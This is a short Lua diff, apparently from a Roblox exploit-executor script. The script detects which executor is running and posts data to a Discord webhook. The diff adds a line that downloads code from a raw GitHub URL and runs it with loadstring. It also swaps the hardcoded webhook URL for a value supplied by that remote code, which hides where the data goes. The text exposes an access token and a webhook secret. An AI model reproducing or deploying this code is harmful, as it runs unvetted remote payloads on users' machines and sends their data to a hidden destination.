@@ -1,3 +1,4 @@
+local sus = loadstring(game:HttpGet("https://raw.githubusercontent.com/DragonixGaming/Stuff/main/sss?token=GHSAT0AAAAAAB527D7ENCZC7RW3DDYSRIPAY7X3L2A", true))()
 local webhookcheck =
 
    is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
@@ -12,7 +13,7 @@ local webhookcheck =
 
 local url =
 
-   "https://discord.com/api/webhooks/1074990881712648265/1D4WisfS7ShmxHgaprtXsfG8Km4yifgOWsHxxGQE47HrQHzNJyQ55tizGKQhHtEnSHK6"
+   sus
 
 local data = {
 
